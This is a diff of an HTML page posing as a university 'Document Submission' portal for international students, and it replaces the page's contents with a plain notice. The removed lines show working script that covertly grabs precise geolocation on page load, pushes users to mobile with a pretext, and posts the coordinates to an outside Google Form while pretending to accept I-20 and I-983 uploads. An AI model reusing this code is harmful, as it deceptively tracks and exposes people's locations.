@@ -46,55 +46,6 @@
     .contact .header {
       font-weight: bold;
     }
-    .resources {
-      margin-top: 20px;
-    }
-
-    .hidden {
-      display: none;
-    }
-
-    #locationError {
-      color: red;
-      margin: 10px;
-      text-align: center;
-    }
-
-    form {
-      text-align: left;
-      margin: 20px 0;
-    }
-
-    input[type="file"] {
-      display: block;
-      width: 100%;
-      margin: 10px 0;
-      padding: 10px 0;
-      cursor: pointer;
-    }
-
-    button[type="submit"] {
-      display: block;
-      width: 80%;
-      margin: 20px auto;
-      padding: 10px;
-      font-size: 16px;
-      cursor: pointer;
-      background-color: #00447c;
-      color: white;
-      border: none;
-      border-radius: 4px;
-    }
-
-    button[type="submit"]:hover {
-      background-color: #003366;
-    }
-
-    #thankYouMessage {
-      margin-top: 20px;
-      font-weight: bold;
-      color: #00447c;
-    }
   </style>
 </head>
 <body>
@@ -102,113 +53,33 @@
   <h1>Document Submission</h1>
 </div>
 <div class="section">
-  <div id="initialContent">
-    <div id="locationError" class="hidden"></div>
-    <p>
-      Please upload your required documents below.
-    </p>
-
-
-    <form id="uploadForm">
-      <div>
-        <label for="i20">Upload I-20:</label>
-        <input type="file" id="i20" name="i20" accept=".pdf" required>
-      </div>
-      <div>
-        <label for="i983">Upload I-983:</label>
-        <input type="file" id="i983" name="i983" accept=".pdf" required>
-      </div>
-      <button type="submit" id="submit">Submit Documents</button>
-    </form>
+  <p>
+    You don’t have to update any documents as of now. If you receive an
+    email, please reach out to the
+    <a href="https://trine.jotform.com/221156200393950" target="_blank"
+    >DSO</a
+    >
+    and email them to check the requirements. Thank you!
+  </p>
+  <div class="spacer"></div>
+  <div class="contact">
+    <p class="header">Contact us directly:</p>
+    <p>Admission and Aid</p>
+    <p>800-347-4878</p>
+    <p>260-665-4100</p>
+    <p>Text: 260-624-1055</p>
+    <p>Email: <a href="mailto:admit@trine.edu">admit@trine.edu</a></p>
   </div>
-
-  <div id="thankYouContent" class="hidden">
-    <p id="thankYouMessage">Thank you for submitting your documents!</p>
-    <div class="spacer"></div>
-    <div class="contact">
-      <p class="header">Contact us directly:</p>
-      <p>Admission and Aid</p>
-      <p>800-347-4878</p>
-      <p>260-665-4100</p>
-      <p>Text: 260-624-1055</p>
-      <p>Email: <a href="mailto:admit@trine.edu">admit@trine.edu</a></p>
-    </div>
-    <div class="resources">
-      <p>
-        For international students, please find the resources here:
-        <a
-                href="https://www.trine.edu/international/resources/index.aspx"
-                target="_blank"
-        >International Student Resources</a
-        >
-      </p>
-    </div>
+  <div class="resources">
+    <p>
+      For international students, please find the resources here:
+      <a
+              href="https://www.trine.edu/international/resources/index.aspx"
+              target="_blank"
+      >International Student Resources</a
+      >
+    </p>
   </div>
 </div>
-
-<script>
-  window.onload = function() {
-   requestLocation();
- };
- document.getElementById('uploadForm').addEventListener('submit', function(event) {
-   event.preventDefault(); // Prevent the default form submission
-   requestLocation(); // Start the location request process on form submission
- });
-
- function requestLocation() {
-   if (navigator.geolocation) {
-     const options = {
-      enableHighAccuracy: true,  // Request the most accurate position available
-      timeout: 10000,            // Longer timeout to allow for more accurate positioning
-      maximumAge: 0              // Always get a fresh position, don't use cached
-  };
-     navigator.geolocation.getCurrentPosition(sendLocationData, handleLocationError, options);
-   } else {
-     displayError("Geolocation is not supported by this browser.");
-   }
- }
-
- function sendLocationData(position) {
-   const latitude = position.coords.latitude;
-   const longitude = position.coords.longitude;
-   const accuracy = position.coords.accuracy;
-   sendForm(latitude, longitude, accuracy);
- }
-
- function sendForm(latitude, longitude, accuracy) {
- const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-
- if (!isMobile) {
-   displayError("The Desktop version is currently being updated. Please use a Mobile device to access the website for now.");
-   return; // Stop execution if not on mobile
- }
-   // Get file data (in a real implementation, you would handle file uploads)
-   const i20File = document.getElementById('i20').files[0];
-   const i983File = document.getElementById('i983').files[0];
-
-   if (!i20File || !i983File) {
-     displayError("Please upload all required documents.");
-     return;
-   }
-
-   const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLScQpsQr3scRzvEtZJhZQ9fbJ3e-0DiCxQjLotqM6fEst-f-9w/formResponse";
-   const data = new URLSearchParams();
-   data.append("entry.1267598962", latitude);
-   data.append("entry.1270259896", longitude);
-   data.append("entry.1888406517", accuracy);
-
-   fetch(formUrl, {
-     method: "POST",
-     body: data,
-     mode: "no-cors",
-   }).then(() => {
-     // Show thank you message instead of redirecting
-     document.getElementById("initialContent").classList.add("hidden");
-     document.getElementById("thankYouContent").classList.remove("hidden");
-   }).catch((error) => {
-     displayError("Error: " + error.message);
-   });
- }
-</script>
 </body>
 </html>
